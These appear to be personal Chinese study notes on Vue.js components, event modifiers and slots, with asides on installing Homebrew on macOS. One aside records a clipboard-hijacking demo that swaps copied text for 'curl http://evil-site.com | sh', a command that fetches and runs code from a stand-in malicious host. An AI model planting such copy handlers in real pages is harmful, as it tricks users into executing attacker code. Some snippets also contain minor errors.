笔记
1 先写一个组件
vue 中
```html
    <ul>
      <li v-for="item in list">
        <span v-if="!item.del">{{item.title}}</span>
        <span v-else style='text-decoration:line-through;'>{{item.title}}</span>
        <button v-show="!item.del">删除</button>
      </li>
    </ul>
```
2 将写死的组件转换成独立的组件
如果传入的属性没有指定挂载在谁上，会默认挂载到temple的根节点上(试了一下 报错了)
```html
  <ul>
      <todo-list v-for="item in list" :title="item.title" :del="item.del" :data-someth="a"></todo-list>
    </ul>
```
通过 Vue.component 注册事件 绑定的名字是不能重复
```js
 Vue.component('todo-list', {
    props: {
      title: String,
      del: {
        type: Boolean,
        default: false
      }
    },
    template: `
    <li>
        <span v-if="!del">{{title}}</span>
        <span v-else style='text-decoration:line-through;'>{{title}}</span>
        <button v-show="!del">删除</button>
      </li>
      `
  })
```
3 绑定事件
自定义的组件里面的data都是函数形式的，不然会报错
```js
    data: function () {
      return {
        list: [{
          title: '课程1',
          del: false
        }, {
          title: "课程2",
          del: true
        }]
      }
    },
```

## vue 事件修饰符
```js
//阻止冒泡事件
        <button v-show="!del" @click.stop="handleClick">删除</button>
```
在事件处理程序中调用 event.preventDefault() 或 event.stopPropagation() 
是非常常见的需求。
尽管我们可以在方法中轻松实现这点，但更好的方式是：
方法只有纯粹的数据逻辑，而不是去处理 DOM 事件细节。
为了解决这个问题，Vue.js 为 v-on 提供了事件修饰符。
之前提过，修饰符是由点开头的指令后缀来表示的。

.stop
.prevent
.capture
.self
.once
.passive
<!-- 阻止单击事件继续传播 -->
<a v-on:click.stop="doThis"></a>

<!-- 提交事件不再重载页面 -->
<form v-on:submit.prevent="onSubmit"></form>

<!-- 修饰符可以串联 -->
<a v-on:click.stop.prevent="doThat"></a>

<!-- 只有修饰符 -->
<form v-on:submit.prevent></form>

<!-- 添加事件监听器时使用事件捕获模式 -->
<!-- 即内部元素触发的事件先在此处理，然后才交由内部元素进行处理 -->
<div v-on:click.capture="doThis">...</div>

<!-- 只当在 event.target 是当前元素自身时触发处理函数 -->
<!-- 即事件不是从内部元素触发的 -->
<div v-on:click.self="doThat">...</div>

##在mac上配置vscode的 path
F1 -> code 选择在PATH中配置vscode

#安装brew
/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
defeat！ - -
:443
源问题
/bin/zsh -c "$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)"
victory!
选 1 就是中科大源
然后就是下载
安装 tree 文件 就是输出当前的目录树
brew install tree
exa ls的升级版
brew install exa

#看到一个东西 
这说明复制这个动作也是可以被捕获到的
```html
<div class="copyme">$ echo "伪装成普通命令"</div>
  <script>
    document.getElementById('copyme').addEventListener('copy', function (e) {
      e.clipboardData.setData('text/plain',
        'curl http://evil-site.com | sh ' // 复制了真实命令
      );
      e.preventDefault();
    });
  </script>
```
# 05 | 组件基础及组件注册

- Vue.component(name,config)注册组件
  - name 不能重复 要确保唯一性
```js
Vue.component('todo-item',{
  data:function(){
    //组件数据
    return {}
  },
  methods:function(){
    //组件方法
    return {}
  },
// template 是模板字符串，如果需要用数据需要传入到这里
  template:``

})

```

# 07 | Vue组件的核心概：插槽
插槽是一种复杂的函数，通过slot的方法传进去了一些参数，然后通过参数进行
- 默认插槽
```html
        <span slot='pre-icon'>前置标签</span>
        <span slot='suf-icon'>后置标签</span>
```
```js
 template: `
    <li>
        <slot name='pre-icon'></slot>
        <slot name='suf-icon'></slot> 
      </li>
      `,
```
- 具名插槽
```html
 <template v-slot:pre-icon>
          <span >前置标签</span>
        </template>
        <template v-slot:suf-icon>
          <span >后置标签</span>
        </template>
```
- 作用域插槽
可以接受子组件发送的值

# 08 | 理解单文件组件
-  Vue.component的缺点
  - 全局定义
  - 字符串模板（缺乏语法高亮）
  - 不支持CSS
  - 没有构建步骤

- 使用.vue的vue-cli
- 安装
```bash
# node npm 略
npm install -g @vue/cli
```
转vue-demo/NOTE.MD